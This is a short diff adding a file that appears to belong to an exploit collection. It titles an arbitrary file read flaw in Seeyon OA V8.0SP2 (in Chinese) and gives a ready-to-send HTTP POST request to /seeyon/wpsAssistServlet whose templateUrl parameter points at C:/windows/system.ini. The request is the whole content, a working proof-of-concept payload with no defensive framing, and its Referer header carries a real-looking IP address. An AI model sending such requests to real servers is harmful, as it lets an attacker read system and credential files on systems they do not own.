@@ -1,0 +1,13 @@
+# 致远OA V8.0SP2 wpsAssistServlet任意文件读取漏洞
+POST /seeyon/wpsAssistServlet HTTP/1.1
+Host: www.testrule.com:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: */*
+Referer: http://219.140.126.103:8090/login.jsp
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+flag=template&templateUrl=C:/windows/system.ini
